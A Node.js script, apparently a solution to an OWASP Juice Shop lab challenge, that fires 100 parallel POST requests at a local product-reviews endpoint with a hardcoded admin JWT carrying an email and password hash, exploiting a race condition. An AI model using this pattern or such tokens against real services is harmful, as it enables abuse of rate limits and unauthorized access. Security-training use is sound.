const axios = require("axios");

async function makePostRequest() {
  try {
    const response = await axios.post(
      "http://localhost:3000/rest/products/reviews",
      {
        id: "xe2HiReiqqhpebdQp",
      },
      {
        headers: {
          Authorization:
            "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwNmIwYzVjMTkyMmVkNGVkNjJhNTQ0OWRkMjA5Yzk2ZCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIxOTIuMTY4LjY1LjEiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjQtMDctMDMgMDQ6MDQ6NTIuMzM1ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjQtMDctMDQgMDI6NTc6NTQuOTcxICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTcyMDA2MTkyMn0.l1hXpR_rGHE27dHRI7Au7bz_81C4OrCgRxBzZWxAbKOKZs_JjZZaGJd_8bJvEEpvoIaa4xy800D1DffFR96zXm1z6vmeQZZ5MiA4sE6n_B5Xk21b-R7rk1gBPEgEfP_n5PdGMpyskQjGd5QERR2LzZ9fqt3fgaPlKVO9LJaLaxU",
        },
      },
    );
    console.log(`Response: ${response.status} ${response.statusText}`);
  } catch (error) {
    console.error(`Error: ${JSON.stringify(error.response.data)}`);
  }
}

// Create an array of promises to perform 100 parallel requests
const requests = Array.from({ length: 100 }, () => makePostRequest());

// Execute all promises in parallel
Promise.all(requests)
  .then(() => {
    console.log("All requests completed.");
  })
  .catch((error) => {
    console.error(`Error in requests: ${error.message}`);
  });
